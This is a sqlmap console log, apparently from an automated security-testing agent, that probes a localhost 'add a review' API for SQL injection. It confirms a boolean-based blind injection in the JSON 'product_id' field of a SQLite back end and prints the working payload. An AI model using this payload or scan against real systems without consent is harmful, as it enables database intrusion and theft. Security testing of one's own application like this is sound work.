        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:03:01 /2025-09-26/

[19:03:03] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap' as the output directory
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[19:03:04] [INFO] testing connection to the target URL
[19:03:04] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:03:04] [INFO] testing if the target URL content is stable
[19:03:04] [INFO] target URL content is stable
[19:03:04] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
[19:03:06] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
[19:03:06] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
[19:03:06] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
[19:03:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:03:06] [WARNING] reflective value(s) found and filtering out
[19:03:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:03:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:03:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:03:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:03:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:03:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:03:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:03:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:03:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:03:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:03:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:03:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:03:15] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:03:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:03:17] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:03:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:03:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:03:19] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:03:20] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:03:21] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:03:22] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:03:23] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:03:24] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:03:24] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:03:25] [INFO] (custom) POST parameter 'JSON product_id' appears to be 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' injectable (with --code=200)
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[19:03:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:03:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:03:25] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[19:03:25] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:03:25] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[19:03:26] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[19:03:26] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[19:03:26] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[19:03:26] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[19:03:26] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[19:03:27] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[19:03:27] [INFO] checking if the injection point on (custom) POST parameter 'JSON product_id' is a false positive
(custom) POST parameter 'JSON product_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1825 HTTP(s) requests:
---
Parameter: JSON product_id ((custom) POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: {"product_id": "1 AND CASE WHEN 1362=1362 THEN 1362 ELSE JSON(CHAR(98,121,116,121)) END", "user_id": "1", "review": "test", "rating": "1"}
---
[19:03:28] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[19:03:28] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1803 times
[19:03:28] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Add_a_review_for_a_product_sqlmap\localhost'

[*] ending @ 19:03:28 /2025-09-26/

